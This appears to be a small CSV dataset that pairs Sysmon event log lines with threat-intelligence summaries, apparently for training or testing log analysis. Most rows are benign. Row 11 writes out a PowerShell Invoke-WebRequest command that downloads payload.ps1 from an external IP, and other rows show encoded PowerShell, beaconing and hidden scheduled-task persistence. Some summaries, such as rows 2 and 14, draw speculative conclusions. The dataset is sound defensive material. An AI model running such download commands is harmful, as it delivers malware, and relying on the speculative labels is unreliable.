id,sysmon_log,cti_summary
1,"Process Create: User Alice launched chrome.exe PID 4200 from C:\Program Files\Google\Chrome\chrome.exe","User Alice executed chrome.exe to initiate a browsing session on the system."
2,"Network Connect: powershell.exe PID 3312 connected to 192.168.1.4:443 via TCP","PowerShell established an outbound TCP connection to the internal IP 192.168.1.4 over port 443, possibly to execute remote commands."
3,"File Create: notepad.exe created file invoice.txt in Documents","Notepad created an invoice.txt text file in the user's Documents folder."
4,"Process Create: python.exe PID 5541 launched by Bob from C:\Python39","User Bob executed python.exe to run a Python script on the local machine."
5,"Registry Modification: winword.exe modified registry key HKCU\Software\Microsoft\Office","Microsoft Word updated registry settings under the user's Office configuration."
6,"Process Create: powershell.exe launched with encoded command -enc UABUADA...","PowerShell executed a Base64-encoded command indicating potential script-based attack activity."
7,"Network Connect: svchost.exe connected to 23.81.120.44:8080","svchost.exe connected to an external IP over port 8080, behavior consistent with command-and-control beaconing."
8,"File Create: rundll32.exe created file tmp.dll in AppData\Local\Temp","rundll32 created tmp.dll in a temporary folder, suggesting possible DLL side-loading activity."
9,"Driver Load: ntoskrnl.exe loaded driver intelppm.sys","The operating system kernel loaded the intelppm.sys driver as part of normal CPU power management."
10,"Network Connect: chrome.exe connected to accounts.google.com via HTTPS","Chrome connected to Google's authentication service over HTTPS, likely for user login."
11,"Process Create: powershell.exe executed command Invoke-WebRequest http://185.11.102.9/payload.ps1","PowerShell downloaded a remote script from external IP 185.11.102.9 using Invoke-WebRequest, indicating possible malware delivery."
12,"WMI Event: wmiprvse.exe executed consumer event query SELECT * FROM __InstanceCreationEvent","wmiprvse executed a WMI consumer subscription query, commonly seen during reconnaissance or system inventory enumeration."
13,"File Create: excel.exe created file budget_2024.xlsx in Documents","Excel created a spreadsheet file named budget_2024.xlsx in the user's Documents folder."
14,"Process Terminate: lgpo.exe PID 4552 terminated unexpectedly","lgpo.exe terminated unexpectedly, suggesting possible manipulation of local group policy settings."
15,"Scheduled Task: schtasks.exe created task 'WindowsTelemetryUpload' scheduled hidden daily at 03:00","schtasks created a hidden scheduled task named WindowsTelemetryUpload to run daily, indicating possible persistence mechanism."
